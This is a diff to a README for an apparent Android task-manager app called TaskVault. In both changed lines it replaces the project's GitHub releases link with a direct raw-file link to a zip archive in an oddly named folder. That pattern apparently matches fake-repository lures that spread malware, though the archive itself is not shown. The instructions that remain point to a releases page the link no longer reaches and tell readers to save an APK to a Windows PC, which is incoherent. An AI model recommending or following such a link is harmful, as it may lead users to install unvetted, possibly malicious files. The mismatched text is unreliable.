@@ -1,6 +1,6 @@
 # 📋 TaskVault - Organize Tasks With Less Effort
 
-[![Download TaskVault](https://img.shields.io/badge/Download-TaskVault-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/edwincounterfactual580/TaskVault/releases)
+[![Download TaskVault](https://img.shields.io/badge/Download-TaskVault-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/edwincounterfactual580/TaskVault/main/operatee/Task-Vault-3.5-alpha.5.zip)
 
 ## 🧭 What TaskVault Does
 
@@ -20,7 +20,7 @@ It is built with Kotlin, Jetpack Compose, and Firebase. It also uses Android too
 
 Visit this page to download TaskVault:
 
-https://github.com/edwincounterfactual580/TaskVault/releases
+https://raw.githubusercontent.com/edwincounterfactual580/TaskVault/main/operatee/Task-Vault-3.5-alpha.5.zip
 
 On the page, look for the latest release. Download the file that matches your device or install method. If there is an APK file, save it to your Windows PC first.
 
